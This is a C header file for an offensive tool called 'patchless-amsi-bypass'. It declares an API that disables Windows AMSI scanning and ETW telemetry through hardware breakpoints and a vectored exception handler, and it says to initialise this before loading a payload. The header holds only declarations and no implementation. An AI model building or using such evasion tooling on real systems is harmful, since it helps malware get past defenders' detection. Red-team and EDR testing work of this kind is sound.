/*
 * patchless-amsi-bypass — public API.
 *
 * For authorised red-team engagements and AV/EDR efficacy testing only.
 * Do not use on systems you are not authorised to test.
 *
 * Author: SixSixSix
 */
#ifndef BYPASS_H
#define BYPASS_H

#include <windows.h>
#include <stdint.h>

#ifdef __cplusplus
extern "C" {
#endif

/* Bitmask of enabled techniques. */
#define BP_AMSI_HWBP   0x01u   /* AMSI bypass via Dr0 hardware breakpoint + VEH */
#define BP_ETW_PATCH   0x04u   /* HW BP on EtwEventWrite                        */

/* Convenience alias: install both AMSI and ETW HW BPs. */
#define BP_ALL         (BP_AMSI_HWBP | BP_ETW_PATCH)

/* Result codes. */
typedef enum {
    BP_OK = 0,
    BP_ERR_AMSI_NOT_LOADED = -1,
    BP_ERR_VEH_REGISTER    = -2,
    BP_ERR_SET_CONTEXT     = -3,
    BP_ERR_NTDLL_OPEN      = -4,
    BP_ERR_NTDLL_MAP       = -5,
    BP_ERR_NTDLL_PROTECT   = -6,
    BP_ERR_ETW_NOT_FOUND   = -7,
    BP_ERR_ETW_PROTECT     = -8,
} bp_result_t;

/* Init the requested bypass primitives.
 * Call from DllMain DLL_PROCESS_ATTACH or from main() before loading payload. */
bp_result_t bp_init(uint32_t mask);

/* Tear down (e.g. before clean exit / DLL unload).  Best-effort. */
void bp_shutdown(void);

/* Diagnostic — return human-readable name for result code. */
const char *bp_strerror(bp_result_t r);

#ifdef __cplusplus
}
#endif

#endif /* BYPASS_H */
